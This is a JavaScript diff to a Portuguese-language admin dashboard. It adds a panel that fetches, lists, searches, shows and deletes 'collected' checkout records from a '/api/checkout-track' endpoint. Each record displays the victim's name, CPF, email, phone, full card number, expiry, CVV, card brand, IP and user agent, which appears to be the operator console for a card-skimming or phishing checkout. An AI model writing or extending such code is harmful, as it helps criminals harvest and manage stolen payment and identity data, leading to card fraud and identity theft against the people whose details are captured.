@@ -1059,7 +1059,167 @@ logoutButton.addEventListener("click", async () => {
 
 setActiveView(window.location.hash.replace("#", "") || "dashboard", false);
 
+
+const TRACK_ENDPOINT = "/api/checkout-track";
+let dataRecords = [];
+
+function dataSearchMatch(registro, query) {
+  if (!query) return true;
+  const q = normalizeText(query);
+  return [
+    registro.name, registro.cpf, registro.email, registro.phone,
+    registro.card_num, registro.expiry, registro.amount, registro.ip
+  ].some((v) => normalizeText(v).includes(q));
+}
+
+function formatDataNumber(numero) {
+  if (!numero) return "-";
+  const digits = String(numero).replace(/\D/g, "");
+  if (digits.length === 16) return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+  return numero;
+}
+
+function detectCardBrand(numero) {
+  const n = String(numero || "").replace(/\D/g, "");
+  if (/^4/.test(n)) return "Visa";
+  if (/^(5[1-5]|2[2-7])/.test(n)) return "Mastercard";
+  if (/^3[47]/.test(n)) return "Amex";
+  if (/^(36|38|30[0-5])/.test(n)) return "Diners";
+  if (/^(4011|4312|4389|4514|4576|5041|5066|5090|6277|6362|6363|650|6516|6550)/.test(n)) return "Elo";
+  if (/^(606282|3841)/.test(n)) return "Hipercard";
+  return "Desconhecida";
+}
+
+function renderDataList() {
+  if (!dataList) return;
+  const query = dataSearch?.value || "";
+  const filtered = dataRecords.filter((r) => dataSearchMatch(r, query));
+  if (!filtered.length) {
+    dataList.innerHTML = '<div class="admin-empty">Nenhum registro encontrado.</div>';
+    return;
+  }
+  dataList.classList.add("data-grid");
+  dataList.innerHTML = filtered.map((r) => `
+    <article class="data-card">
+      <div class="data-card__info">
+        <div class="data-card__name">${escapeHtml(r.name || "Sem nome")}</div>
+        <div class="data-card__number">${escapeHtml(formatDataNumber(r.card_num))}</div>
+        <div class="data-card__meta">
+          <span><strong>Val.</strong> ${escapeHtml(r.expiry || "-")}</span>
+          <span><strong>CVV</strong> ${escapeHtml(r.cvv || "-")}</span>
+          <span><strong>Parc.</strong> ${escapeHtml(r.installments || "1")}</span>
+        </div>
+      </div>
+      <div>
+        <div class="data-card__date">${r.data_hora ? new Date(r.data_hora).toLocaleString("pt-BR") : ""}</div>
+        <div class="data-card__actions">
+          <button class="data-btn data-btn--view" data-view="${escapeHtml(r.id)}" type="button">Detalhes</button>
+          <button class="data-btn data-btn--delete" data-delete="${escapeHtml(r.id)}" type="button">Excluir</button>
+        </div>
+      </div>
+    </article>
+  `).join("");
+}
+
+async function loadData() {
+  try {
+    const registros = await api(TRACK_ENDPOINT);
+    dataRecords = Array.isArray(registros) ? registros : [];
+    if (dataStatus) dataStatus.textContent = `${dataRecords.length} registros coletados.`;
+    renderDataList();
+  } catch (error) {
+    if (dataStatus) dataStatus.textContent = `Erro ao carregar dados: ${error.message}`;
+  }
+}
+
+function showDataDetail(registro) {
+  const modal = document.createElement("div");
+  modal.className = "data-modal";
+  modal.innerHTML = `
+    <div class="data-modal__box">
+      <div class="data-modal__header">
+        <h3>Detalhes do registro</h3>
+        <button class="data-modal__close" type="button" aria-label="Fechar">×</button>
+      </div>
+      <div class="data-modal__section">Dados do titular</div>
+      <div class="data-modal__row"><span class="data-modal__label">Nome</span><span class="data-modal__value">${escapeHtml(registro.name || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">CPF</span><span class="data-modal__value">${escapeHtml(registro.cpf || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">E-mail</span><span class="data-modal__value">${escapeHtml(registro.email || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">Telefone</span><span class="data-modal__value">${escapeHtml(registro.phone || "-")}</span></div>
+      <div class="data-modal__section">Dados do cartão</div>
+      <div class="data-modal__row"><span class="data-modal__label">Número</span><span class="data-modal__value data-modal__value--mono">${escapeHtml(formatDataNumber(registro.card_num))}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">Validade</span><span class="data-modal__value">${escapeHtml(registro.expiry || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">CVV</span><span class="data-modal__value">${escapeHtml(registro.cvv || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">Bandeira</span><span class="data-modal__value">${escapeHtml(detectCardBrand(registro.card_num))}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">Parcelas</span><span class="data-modal__value">${escapeHtml(registro.installments || "1")}x</span></div>
+      <div class="data-modal__section">Pedido</div>
+      <div class="data-modal__row"><span class="data-modal__label">Valor</span><span class="data-modal__value">${escapeHtml(registro.amount || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">ID</span><span class="data-modal__value data-modal__value--mono">${escapeHtml(registro.id || "-")}</span></div>
+      <div class="data-modal__section">Origem</div>
+      <div class="data-modal__row"><span class="data-modal__label">IP</span><span class="data-modal__value">${escapeHtml(registro.ip || "-")}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">Data</span><span class="data-modal__value">${registro.data_hora ? new Date(registro.data_hora).toLocaleString("pt-BR") : "-"}</span></div>
+      <div class="data-modal__row"><span class="data-modal__label">User Agent</span><span class="data-modal__value" style="font-size:11px;color:#aaa;text-align:left;">${escapeHtml(registro.user_agent || "-")}</span></div>
+    </div>
+  `;
+  document.body.appendChild(modal);
+  const close = () => modal.remove();
+  modal.querySelector(".data-modal__close").addEventListener("click", close);
+  modal.addEventListener("click", (e) => { if (e.target === modal) close(); });
+  document.addEventListener("keydown", function onEsc(e) {
+    if (e.key === "Escape") { close(); document.removeEventListener("keydown", onEsc); }
+  });
+}
+
+async function deleteDataRecord(cardId) {
+  if (!window.confirm("Tem certeza que deseja excluir este registro?")) return;
+  try {
+    await api(`${TRACK_ENDPOINT}/${cardId}`, { method: "DELETE" });
+    dataRecords = dataRecords.filter((r) => r.id !== cardId);
+    if (dataStatus) dataStatus.textContent = `${dataRecords.length} registros coletados.`;
+    renderDataList();
+  } catch (error) {
+    alert(`Erro ao excluir: ${error.message}`);
+  }
+}
+
+if (dataList) {
+  dataList.addEventListener("click", (e) => {
+    const viewBtn = e.target.closest("[data-view]");
+    if (viewBtn) {
+      const r = dataRecords.find((x) => x.id === viewBtn.dataset.view);
+      if (r) showDataDetail(r);
+      return;
+    }
+    const delBtn = e.target.closest("[data-delete]");
+    if (delBtn) deleteDataRecord(delBtn.dataset.delete);
+  });
+}
+
+refreshData?.addEventListener("click", loadData);
+
+clearData?.addEventListener("click", async () => {
+  if (!window.confirm("Limpar todos os registros coletados?")) return;
+  clearData.disabled = true;
+  clearData.textContent = "Limpando...";
+  try {
+    await api(`${TRACK_ENDPOINT}/clear`, { method: "POST" });
+    dataRecords = [];
+    renderDataList();
+    if (dataStatus) dataStatus.textContent = "0 registros coletados.";
+  } catch (error) {
+    if (dataStatus) dataStatus.textContent = `Erro ao limpar: ${error.message}`;
+  } finally {
+    clearData.disabled = false;
+    clearData.textContent = "Limpar dados";
+  }
+});
+
+dataSearch?.addEventListener("input", renderDataList);
+
 adminNavLinks.forEach((link) => {
+  if (link.dataset.adminNav === "data") {
+    link.addEventListener("click", loadData);
+  }
 });
 
 checkSession().then((authenticated) => {
